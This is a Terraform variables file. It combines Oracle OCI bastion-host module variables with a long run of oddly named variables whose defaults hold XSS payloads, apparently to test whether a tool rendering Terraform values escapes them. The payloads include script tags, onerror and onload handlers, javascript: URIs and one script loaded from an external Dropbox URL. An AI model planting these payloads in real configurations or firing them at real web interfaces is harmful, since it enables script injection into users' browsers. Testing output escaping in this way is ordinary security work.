variable "dynatrace-operator_enabled" { 

description = "Enable the dynatrace operator" 

type = bool 

default = true 

}

variable "kube-downscaler_enabled" { 

description = "Enable kube-downscaler" 

type = bool 

default = true 

} 



variable "test" {
  type = bool
  default = true
 }


# Copyright (c) 2019, 2021 Oracle Corporation and/or affiliates.  All rights reserved.
# Licensed under the Universal Permissive License v 1.0 as shown at https://oss.oracle.com/licenses/upl

# provider parameters
variable "tenancy_id" {
  description = "tenancy id where to create the sources"
  type        = string
  default     = ""
}

# general oci parameters
variable "compartment_id" {
  description = "compartment id where to create all resources"
  type        = string
}

variable "label_prefix" {
  description = "a string that will be prepended to all resources"
  type        = string
  default     = "none"
}

# network parameters
variable "availability_domain" {
  description = "the AD to place the bastion host"
  default     = 1
  type        = number
}

variable "bastion_access" {
  description = "A list of CIDR blocks to which ssh access to the bastion must be restricted to. *anywhere* is equivalent to 0.0.0.0/0 and allows ssh access from anywhere."
  default     = ["anywhere"]
  type        = list
}

variable "ig_route_id" {
  description = "the route id to the internet gateway"
  type        = string
}

variable "netnum" {
  description = "0-based index of the bastion subnet when the VCN's CIDR is masked with the corresponding newbit value."
  default     = 0
  type        = number
}

variable "newbits" {
  description = "The difference between the VCN's netmask and the desired bastion subnet mask"
  default     = 14
  type        = number
}

variable "vcn_id" {
  description = "The id of the VCN to use when creating the bastion resources."
  type        = string
}

# bastion host parameters
variable "bastion_image_id" {
  description = "Provide a custom image id for the bastion host or leave as Autonomous."
  default     = "Autonomous"
  type        = string
}

variable "bastion_os_version" {
  description = "In case Autonomous Linux is used, allow specification of Autonomous version"
  default     = "7.9"
  type        = string
}

variable "bastion_shape" {
  description = "The shape of bastion instance."
  default = {
    shape = "VM.Standard.E4.Flex", ocpus = 1, memory = 4, boot_volume_size = 50
  }
  type = map(any)
}

variable "bastion_state" {
  description = "The target state for the instance. Could be set to RUNNING or STOPPED. (Updatable)"
  default     = "RUNNING"
  type        = string
}

variable "bastion_timezone" {
  description = "The preferred timezone for the bastion host."
  default     = "Australia/Sydney"
  type        = string
}

variable "bastion_type" {
  description = "Whether to make the bastion host public or private."
  default     = "public"
  type        = string
}

variable "ssh_public_key" {
  description = "the content of the ssh public key used to access the bastion. set this or the ssh_public_key_path"
  default     = ""
  type        = string
}

variable "ssh_public_key_path" {
  description = "path to the ssh public key used to access the bastion. set this or the ssh_public_key"
  default     = ""
  type        = string
}

variable "upgrade_bastion" {
  description = "Whether to upgrade the bastion host packages after provisioning. It's useful to set this to false during development/testing so the bastion is provisioned faster."
  default     = false
  type        = bool
}

# bastion notification
variable "enable_bastion_notification" {
  description = "Whether to enable ONS notification for the bastion host."
  default     = false
  type        = bool
}

variable "bastion_notification_endpoint" {
  description = "The subscription notification endpoint. Email address to be notified."
  default     = null
  type        = string
}

variable "bastion_notification_protocol" {
  description = "The notification protocol used."
  default     = "EMAIL"
  type        = string
}

variable "bastion_notification_topic" {
  description = "The name of the notification topic"
  default     = "bastion"
  type        = string
}

# tagging
variable "freeform_tags" {
  description = "Freeform tags for bastion"
  default = {
    access      = "public"
    environment = "dev"
    role        = "bastion"
  }
  type = map(any)
}





variable "hello" {
type = string
default = "<script>alert(\"hellox worldss\");</script>"
}

variable "oncut" {
type = string
default = "<q/oncut=alert()>X"
}

variable "imadge" {
type = string
default = "<IMG SRC=\"https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcSwHpwfa1Qe0HNKWYm4wF2ir1CDungWwaPGtA&usqp=CAU\"=jAVasCrIPt:alert(‘XSS’)>"
}

variable "alert" {
type = string
default = "‘; alert(1);"
}

variable "oneerror" {
type = string
default = "<img src=xss onerror=alert(1)>"
}
variable "LOL" {
type = string
default = "LOL<style>*{/*all*/color/*all*/:/*all*/red/*all*/;/[0]*IE,Safari*[0]/color:green;color:bl/*IE*/ue;}</style>"
}
 variable "win_222anmi" {
   default = "</script><script>alert(1)</script>"
 }
#
variable "var_1" {
  description = "<form><a href=\"javascript:alert(1)\">X</a></form>"
  default = "<form><a href=\"javascript:alert(1)\">X</a></form>"
}


 variable "in_ami" {
default = "   <ScRiPt>alert(1)</sCriPt>"
 }
# variable "11win_ami" {
#   <IMG SRC=jAVasCrIPt:alert(‘XSS’)>
# }
#
#
 variable "l2win_ami" {
 default = " <IMG SRC=javascript:alert/(&quot;XSS&quot/;/)>"
 }
 variable "ppp222win_ami" {
default = "   <img src=xss onerror=alert(1)>"
 }
#
   variable "d22222win_ami" {
default = "<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'"
   }
  variable "w1in_ami" {
  default = "<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>"
}
  variable "w2in_ami" {
default = "  <ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?"
}




variable "winxfgh_ami" {
default = "  <iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>"
}

  variable "win_xfbhdfgbami" {
  default = "<script ^__^>alert(String.fromCharCode(49))</script ^__^"
}


  variable "windhdfhfdxh_ami" {
  default = "<div onmouseover='alert&lpar;1&rpar;'>DIV</div>"
}
  variable "wincvbnxfgh_ami" {
  default = "<var onmouseover=\"prompt(1)\">On Mouse Over</var>"
}


  variable "wixfhfnfgnfncfn_ami" {
default = "  <svg/onload=alert(1)"
}
  variable "wcnfndfnfgnin_ami" {
  default = "<input value=<><iframe/src=javascript:confirm(1)"
}
  variable "wixcfhncfgncfncfn_ami" {
default = "  <input type=\"text\" value=`` <div/onmouseover='alert(1)'>X</div>"
}

  variable "win_vxdfvxdxami" {
  default = "<--`<img/src=` onerror=alert(1)> --!>"
}

  variable "win_agkjkhukvmi" {
  default = "<form><button formaction=javascript&colon;alert(1)>CLICKME"
}
  variable "win_acghjncghnnmi" {
  default = "<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>"
}

variable "win_amcghncgncgyi" {
  default = "<IMG “””><SCRIPT>alert(“XSS”)</SCRIPT>”>"
}

variable "win_xftbnxfbnfxtnfami" {
default = "<BODY ONLOAD=alert(‘XSS’)>"
}
variable "win_xftgbnxfbnfxtnxfami" {
  default = "<INPUT TYPE=”IMAGE” SRC=”javascript:alert(‘XSS’);”>"
}

variable "win_amjkljkglkli" {
default = "javascript:alert(\"hellox worldss\")"
}

variable "wifgbfgbfgbxfgbn_ami" {
  default = "<h1><font color=blue>hellox worldss</h1>"
}
variable "wzdfbghmcghnin_ami" {
  default = "<BODY ONLOAD=alert('hellox worldss')>"
}

variable "wfxgnndxin_ami" {
  default = "<body onscroll=alert(XSS)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>"
}

output "out_1" {
  description = "<form><a href=\"javascript:alert(1)\">X</a></form>"
  value = "<form><a href=\"javascript:alert(1)\">X</a></form>"
}
